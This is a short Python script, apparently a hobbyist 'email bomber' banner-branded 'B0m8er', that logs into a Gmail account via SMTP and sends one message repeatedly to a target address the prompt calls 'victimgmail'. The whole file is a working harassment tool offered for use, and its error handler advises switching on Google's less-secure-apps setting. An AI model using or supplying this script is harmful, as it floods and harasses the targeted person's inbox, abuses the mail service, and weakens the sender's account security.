import smtplib
import ssl

c = "\033[036m"
w = "\033[037m"
def logo():
    banner = '''
\t###################
\t#     B0m8er      #
\t#  coded by X-Ray #
\t###################
    '''
    print(banner)

def main():
    try:
        port = 587  # For starttls
        smtp = "smtp.gmail.com"
        yours = input("[+] {}yourgmail{} [+] ".format(c,w))
        password = input("[+] {}yourpassword{} [+] ".format(c,w))
        victim = input("[+] {}victimgmail{} [+] ".format(c,w))
        time = int(input("[+] {}amount{} [+] ".format(c,w)))
        time = time+1
        message = """\
        Subject: test bombing

        This message is sent from Python."""#you can change here
        to_default = ssl.create_default_context()
        with smtplib.SMTP(smtp, port) as s:
            s.ehlo()
            s.starttls(context=to_default)
            s.ehlo()
            s.login(yours, password)
            for i in range(1,time):
                s.sendmail(yours, victim, message)
                print(i,"[{}success{}]".format(c,w))


    #smtplib.SMTPAuthenticationError:
    except smtplib.SMTPAuthenticationError:
        print("_"*50)
        print("Except error\nMake your password to sure (or) ")
        print("Go to this url and Change off to on\nhttps://myaccount.google.com/lesssecureapps")


logo()
main()
